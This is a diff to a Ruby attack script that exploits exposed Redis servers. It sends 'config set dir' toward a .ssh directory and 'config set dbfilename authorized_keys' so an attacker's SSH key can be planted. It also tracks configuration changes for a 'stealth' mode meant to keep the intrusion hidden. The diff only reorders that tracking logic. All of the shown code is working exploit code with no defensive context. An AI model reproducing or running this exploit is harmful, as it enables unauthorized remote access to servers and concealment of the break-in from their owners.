@@ -66,15 +66,7 @@ if !@opts[:host]
 	return
 end
 
-#For exit and log oneliners
 @changedConfigDir = @changedConfigFile = false
-def error
-	yield
-	if @changedConfigDir or @changedConfigFile
-		Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
-	end
-	exit 1
-end
 
 class Log
 
@@ -108,6 +100,15 @@ class Log
 		p msg
 	end
 
+end
+
+#For exit and log oneliners
+def error
+	yield
+	if @changedConfigDir or @changedConfigFile
+		Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
+	end
+	exit 1
 end
 
 def send msg
@@ -254,9 +255,9 @@ end
 
 Log.info "Setting configuration directory"
 out = send "config set dir #{@opts[:dir]}"
+@changedConfigDir = true
 Log.res out if @opts[:verbose]
 error {Log.err "Failed to change config directory to .ssh (might not exist)"} if out != "+OK\r\n"
-@changedConfigDir = true
 
 if @opts[:stealth]
 	# Config directory retrieval
@@ -270,9 +271,9 @@ end
 
 Log.info "Change database file to authorized_keys"
 out = send "config set dbfilename authorized_keys"
+@changedConfigFile = true
 Log.res out if @opts[:verbose]
 error {Log.err "Failed to change config database filename"} if out != "+OK\r\n"
-@changedConfigFile = true
 
 =begin # Checking if we can set a key
 Log.info "Checking if we can set a key"
